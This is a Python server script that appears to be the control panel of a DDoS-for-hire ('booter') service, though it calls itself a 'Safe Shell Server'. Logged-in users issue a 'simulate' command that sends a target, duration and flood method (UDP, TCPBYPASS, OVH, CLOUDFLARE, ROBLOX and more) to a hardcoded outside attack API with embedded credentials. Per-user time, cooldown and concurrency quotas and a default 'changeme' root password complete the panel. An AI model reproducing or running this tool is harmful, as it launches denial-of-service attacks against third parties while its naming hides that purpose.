#!/usr/bin/env python3
"""
main.py - Robust, single-file safe interactive TCP shell server.

Features:
- Auto-normalizes users.json (handles old flat formats)
- Root user always admin (default password: changeme)
- Admins can: users list | users add <name> | users delete <name> | users edit <name> | users kick <name>
- Methods use API at http://151.243.109.51:112/api/attack
- Login fixed so empty Enter doesn't spam errors
"""

import socket
import os
import json
import hashlib
import time
import threading
import logging
import requests

# Logging
logging.basicConfig(level=logging.DEBUG, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

# Config
HOST = "0.0.0.0"
PORT = 5000
USERS_FILE = "users.json"
MAX_LOGIN_ATTEMPTS = 5
API_URL = "http://151.243.109.51:112/api/attack"
API_USER = "supp"
API_KEY = "nevin123"

# ANSI (for telnet/tty clients)
RESET = "\033[0m"
GREEN = "\033[92m"

# Track active connections
active_connections = {}  # Dict to store username: [conn1, conn2, ...]
connections_lock = threading.Lock()

# Allowed methods
SIM_METHODS = [
    "DNS",
    "HTTP",
    "UDP",
    "SSH",
    "OVH",
    "TCP",
    "FIVEM",
    "TCPBYPASS",
    "DISCORD",
    "ROBLOX",
    "GAMEBOOM",
    "GUDP",
    "HOME",
    "BROWSER",
    "TLS",
    "CLOUDFLARE",
    "UDP-VIP",
    "HTTP-VIP",
    "TCP-VIP",
    "UDP-UNIVERSE",
    "HTTP-UNIVERSE",
    "TCP-UNIVERSE",
    "POWER"
]

# ---------- Utilities ----------

def hash_pw(pw: str) -> str:
    return hashlib.sha256(pw.encode("utf-8")).hexdigest()

def normalize_user_entry(username: str, info) -> dict:
    """Return a user dict with all required keys, accepting old formats."""
    if isinstance(info, str):
        # old flat format: value is password hash
        return {
            "password": info,
            "maxtime": 3600,
            "cooldown": 60,
            "concurrent": 3,
            "methods": SIM_METHODS.copy(),
            "is_admin": False
        }
    if isinstance(info, dict):
        return {
            "password": info.get("password", hash_pw("changeme")),
            "maxtime": int(info.get("maxtime", 3600)),
            "cooldown": int(info.get("cooldown", 60)),
            "concurrent": int(info.get("concurrent", 3)),
            "methods": info.get("methods", SIM_METHODS.copy()) or SIM_METHODS.copy(),
            "is_admin": bool(info.get("is_admin", False))
        }
    # fallback default
    return {
        "password": hash_pw("changeme"),
        "maxtime": 3600,
        "cooldown": 60,
        "concurrent": 3,
        "methods": SIM_METHODS.copy(),
        "is_admin": False
    }

def load_users() -> dict:
    """Load and normalize users.json. Ensures root exists and is admin."""
    if not os.path.exists(USERS_FILE):
        users = {"root": normalize_user_entry("root", {"password": hash_pw("changeme"), "is_admin": True})}
        save_users(users)
        logger.info("Created default users.json with root user.")
        return users

    try:
        with open(USERS_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
    except Exception as e:
        logger.error(f"Failed to read {USERS_FILE}: {e}. Recreating default users file.")
        users = {"root": normalize_user_entry("root", {"password": hash_pw("changeme"), "is_admin": True})}
        save_users(users)
        return users

    if not isinstance(data, dict):
        logger.error(f"{USERS_FILE} has unexpected format. Recreating default users file.")
        users = {"root": normalize_user_entry("root", {"password": hash_pw("changeme"), "is_admin": True})}
        save_users(users)
        return users

    normalized = {}
    for uname, info in data.items():
        try:
            normalized[uname] = normalize_user_entry(uname, info)
        except Exception:
            # skip invalid entries
            logger.warning(f"Skipping invalid user entry: {uname}")

    # ensure root exists and is admin
    if "root" not in normalized:
        normalized["root"] = normalize_user_entry("root", {"password": hash_pw("changeme"), "is_admin": True})
    normalized["root"]["is_admin"] = True

    # save normalized file back (repairs)
    try:
        save_users(normalized)
    except Exception as e:
        logger.warning(f"Could not save normalized users.json: {e}")

    logger.debug(f"Loaded users: {list(normalized.keys())}")
    return normalized

def save_users(users: dict):
    tmp = USERS_FILE + ".tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump(users, f, indent=2, ensure_ascii=False)
    os.replace(tmp, USERS_FILE)
    logger.debug("users.json saved")

# ---------- Socket helpers ----------

def send_line(conn, text: str):
    if not text.endswith("\r\n"):
        text = text + "\r\n"
    try:
        conn.sendall(text.encode("utf-8"))
    except Exception as e:
        logger.debug(f"send_line error: {e}")

def send_no_newline(conn, text: str):
    try:
        conn.sendall(text.encode("utf-8"))
    except Exception as e:
        logger.debug(f"send_no_newline error: {e}")

def send_prompt(conn, username: str):
    prompt = f"{GREEN}{username}{RESET}@safe-shell> "
    send_no_newline(conn, prompt)

class ConnBuffer:
    """Buffered reader for a blocking socket; returns '' on empty input and None on closed connection."""
    def __init__(self, conn):
        self.conn = conn
        self.buf = b""

    def recv_into_buffer(self):
        try:
            data = self.conn.recv(4096)
            if not data:
                return False
            self.buf += data
            return True
        except Exception as e:
            logger.debug(f"recv_into_buffer error: {e}")
            return False

    def read_line(self):
        # accumulate until newline or CR or connection closed
        while b"\n" not in self.buf and b"\r" not in self.buf:
            ok = self.recv_into_buffer()
            if not ok:
                # connection closed (no more data)
                return None
        # find earliest newline or CR
        idx_n = self.buf.find(b"\n") if b"\n" in self.buf else None
        idx_r = self.buf.find(b"\r") if b"\r" in self.buf else None
        indices = [i for i in (idx_n, idx_r) if i is not None and i >= 0]
        if not indices:
            # take all
            line_bytes = self.buf
            self.buf = b""
        else:
            idx = min(indices)
            line_bytes = self.buf[:idx]
            consume = idx + 1
            # handle CRLF
            if self.buf[idx:idx+1] == b"\r" and len(self.buf) > idx+1 and self.buf[idx+1:idx+2] == b"\n":
                consume += 1
            self.buf = self.buf[consume:]
        try:
            return line_bytes.decode("utf-8", errors="ignore").strip()
        except Exception:
            return ""

# ---------- API task ----------

def simulate_task(method, target, duration):
    if method not in SIM_METHODS:
        return False, "Unknown method."
    if not str(duration).isdigit():
        return False, "Duration must be a number."
    duration_int = int(duration)
    try:
        params = {
            "user": API_USER,
            "key": API_KEY,
            "target": target,
            "port": 80,  # Standardport, kann angepasst werden
            "time": duration_int,
            "method": method
        }
        response = requests.get(API_URL, params=params, timeout=10)
        if response.status_code == 200:
            logger.info(f"API request for {method} on {target} for {duration_int}s sent successfully")
            return True, f"Started {method} on {target} for {duration_int} seconds. API response: {response.text}"
        else:
            logger.error(f"API request failed for {method}: {response.status_code} {response.text}")
            return False, f"API request failed: {response.status_code} {response.text}"
    except Exception as e:
        logger.error(f"API request error for {method}: {e}")
        return False, f"API request error: {e}"

# ---------- Interaction helpers ----------

def ask_int(cb: ConnBuffer, conn, prompt, default):
    send_no_newline(conn, f"{prompt} [{default}]: ")
    v = cb.read_line()
    if v is None:
        return default
    if v.strip() == "":
        return default
    if v.isdigit():
        return int(v)
    return default

def ask_bool(cb: ConnBuffer, conn, prompt, default=False):
    send_no_newline(conn, f"{prompt} (y/n) [{'y' if default else 'n'}]: ")
    v = cb.read_line()
    if v is None:
        return default
    if v.strip() == "":
        return default
    return v.strip().lower().startswith("y")

def ask_methods(cb: ConnBuffer, conn, current=None):
    allowed = []
    send_line(conn, "Select allowed methods (yes/no). Leave empty = default (no).")
    for m in SIM_METHODS:
        default = (current and m in current)
        ans = ask_bool(cb, conn, f"  {m}", default)
        if ans:
            allowed.append(m)
    if not allowed:
        return SIM_METHODS.copy()
    return allowed

# ---------- Session handling ----------

def handle_session(conn, addr):
    cb = ConnBuffer(conn)
    send_line(conn, "Welcome to Safe Shell Server")
    attempts = 0
    username = None
    authenticated = False

    # Login loop: skip empty inputs, count only wrong attempts
    while attempts < MAX_LOGIN_ATTEMPTS and not authenticated:
        send_no_newline(conn, "Login as: ")
        u = cb.read_line()
        if u is None:
            logger.debug("Connection closed while reading username")
            conn.close()
            return
        if u.strip() == "":
            # just reprompt
            continue

        send_no_newline(conn, "user's password: ")
        p = cb.read_line()
        if p is None:
            logger.debug("Connection closed while reading password")
            conn.close()
            return
        if p.strip() == "":
            # reprompt from username again
            continue

        users = load_users()  # reload to reflect file changes
        if u in users and users[u].get("password") == hash_pw(p):
            username = u
            authenticated = True
            logger.info(f"User {u} authenticated from {addr}")
            # Register connection
            with connections_lock:
                if username not in active_connections:
                    active_connections[username] = []
                active_connections[username].append(conn)
            break
        else:
            attempts += 1
            remaining = MAX_LOGIN_ATTEMPTS - attempts
            if remaining <= 0:
                send_line(conn, "Too many failed attempts. Closing.")
                conn.close()
                return
            send_line(conn, f"Wrong login. {remaining} attempts left.")

    # Authenticated
    send_line(conn, f"Welcome, {username}!")
    send_prompt(conn, username)

    try:
        while True:
            line = cb.read_line()
            if line is None:
                break
            cmd_line = line.strip()
            if cmd_line == "":
                send_prompt(conn, username)
                continue
            parts = cmd_line.split()
            cmd = parts[0].lower()

            # exits
            if cmd in ("exit", "quit", "logout"):
                send_line(conn, "Goodbye.")
                break

            if cmd == "help":
                send_line(conn, "Commands:")
                send_line(conn, "  help")
                send_line(conn, "  users list")
                send_line(conn, "  users add <name>")
                send_line(conn, "  users delete <name>")
                send_line(conn, "  users edit <name>")
                send_line(conn, "  users kick <name>")
                send_line(conn, "  simulate <method> <target> <seconds>")
                send_line(conn, "  methods")
                send_prompt(conn, username)
                continue

            if cmd == "methods":
                send_line(conn, "Available methods:")
                for i, method in enumerate(SIM_METHODS, 1):
                    send_line(conn, f"{i}. {method}")
                send_prompt(conn, username)
                continue

            if cmd == "users":
                users = load_users()
                if username not in users:
                    send_line(conn, "Your account no longer exists. Disconnecting.")
                    break
                if not users[username].get("is_admin", False):
                    send_line(conn, "Permission denied. Admins only.")
                    send_prompt(conn, username)
                    continue
                if len(parts) < 2:
                    send_line(conn, "Usage: users [list|add|delete|edit|kick]")
                    send_prompt(conn, username)
                    continue

                sub = parts[1].lower()

                if sub == "list":
                    # show only usernames
                    for u in users.keys():
                        send_line(conn, f"- {u}")
                    send_prompt(conn, username)
                    continue

                if sub == "add" and len(parts) >= 3:
                    new_user = parts[2]
                    users = load_users()
                    if new_user in users:
                        send_line(conn, f"User '{new_user}' already exists.")
                        send_prompt(conn, username)
                        continue

                    # interactive creation: ask all fields
                    send_no_newline(conn, f"Password for {new_user}: ")
                    pw = cb.read_line()
                    if pw is None:
                        send_line(conn, "Aborted.")
                        send_prompt(conn, username)
                        continue
                    if pw.strip() == "":
                        pw = "changeme"

                    maxtime = ask_int(cb, conn, "Max time (sec)", 3600)
                    cooldown = ask_int(cb, conn, "Cooldown (sec)", 60)
                    concurrent = ask_int(cb, conn, "Concurrent", 3)
                    methods = ask_methods(cb, conn, None)
                    is_admin = ask_bool(cb, conn, "Grant admin rights?", False)

                    users[new_user] = {
                        "password": hash_pw(pw),
                        "maxtime": int(maxtime),
                        "cooldown": int(cooldown),
                        "concurrent": int(concurrent),
                        "methods": methods,
                        "is_admin": bool(is_admin)
                    }
                    save_users(users)
                    send_line(conn, f"User '{new_user}' created.")
                    send_prompt(conn, username)
                    continue

                if sub == "delete" and len(parts) >= 3:
                    target = parts[2]
                    users = load_users()
                    if target not in users:
                        send_line(conn, f"User '{target}' not found.")
                        send_prompt(conn, username)
                        continue
                    if target == "root":
                        send_line(conn, "Cannot delete root user.")
                        send_prompt(conn, username)
                        continue
                    del users[target]
                    save_users(users)
                    send_line(conn, f"User '{target}' deleted.")
                    send_prompt(conn, username)
                    continue

                if sub == "edit" and len(parts) >= 3:
                    target = parts[2]
                    users = load_users()
                    if target not in users:
                        send_line(conn, f"User '{target}' not found.")
                        send_prompt(conn, username)
                        continue
                    if target == "root" and username != "root":
                        send_line(conn, "Only root can edit root user.")
                        send_prompt(conn, username)
                        continue

                    # interactive editing: ask all fields
                    current = users[target]
                    maxtime = ask_int(cb, conn, "Max time (sec)", current.get("maxtime", 3600))
                    cooldown = ask_int(cb, conn, "Cooldown (sec)", current.get("cooldown", 60))
                    concurrent = ask_int(cb, conn, "Concurrent", current.get("concurrent", 3))
                    methods = ask_methods(cb, conn, current.get("methods", SIM_METHODS.copy()))
                    is_admin = ask_bool(cb, conn, "Grant admin rights?", current.get("is_admin", False))

                    users[target] = {
                        "password": current.get("password", hash_pw("changeme")),
                        "maxtime": int(maxtime),
                        "cooldown": int(cooldown),
                        "concurrent": int(concurrent),
                        "methods": methods,
                        "is_admin": bool(is_admin)
                    }
                    save_users(users)
                    send_line(conn, f"User '{target}' updated.")
                    send_prompt(conn, username)
                    continue

                if sub == "kick" and len(parts) >= 3:
                    target = parts[2]
                    users = load_users()
                    if target not in users:
                        send_line(conn, f"User '{target}' not found.")
                        send_prompt(conn, username)
                        continue
                    if target == "root":
                        send_line(conn, "Cannot kick root user.")
                        send_prompt(conn, username)
                        continue
                    with connections_lock:
                        if target not in active_connections or not active_connections[target]:
                            send_line(conn, f"User '{target}' has no active connections.")
                            send_prompt(conn, username)
                            continue
                        # Close all connections for the target user
                        for target_conn in active_connections[target]:
                            try:
                                send_line(target_conn, "You have been kicked by an admin.")
                                target_conn.close()
                            except Exception as e:
                                logger.debug(f"Error closing connection for {target}: {e}")
                        active_connections[target] = []
                    send_line(conn, f"User '{target}' kicked.")
                    send_prompt(conn, username)
                    continue

                send_line(conn, "Unknown users subcommand.")
                send_prompt(conn, username)
                continue

            if cmd == "simulate" and len(parts) >= 4:
                users = load_users()
                if username not in users:
                    send_line(conn, "Your account no longer exists.")
                    break
                method = parts[1]
                target = parts[2]
                duration = parts[3]
                if method not in users[username].get("methods", []):
                    send_line(conn, f"Method '{method}' not allowed for your account.")
                    send_prompt(conn, username)
                    continue
                ok, msg = simulate_task(method, target, duration)
                send_line(conn, msg if ok else f"Error: {msg}")
                send_prompt(conn, username)
                continue

            # unknown
            send_line(conn, "Unknown command. Type 'help'.")
            send_prompt(conn, username)

    except Exception as e:
        logger.exception(f"Session error for {addr}: {e}")
        try:
            send_line(conn, f"Server error: {e}")
        except Exception:
            pass
    finally:
        # Remove connection from active_connections
        with connections_lock:
            if username in active_connections and conn in active_connections[username]:
                active_connections[username].remove(conn)
                if not active_connections[username]:
                    del active_connections[username]
        try:
            conn.close()
        except Exception:
            pass

# ---------- Server loop ----------

def accept_loop(server_sock):
    while True:
        try:
            conn, addr = server_sock.accept()
            threading.Thread(target=handle_session, args=(conn, addr), daemon=True).start()
        except Exception as e:
            logger.error(f"Accept error: {e}")
            time.sleep(1)

def main():
    load_users()  # ensure users.json exists and normalized
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen(5)
        logger.info(f"Server listening on {HOST}:{PORT}")
        accept_loop(s)

if __name__ == "__main__":
    main()
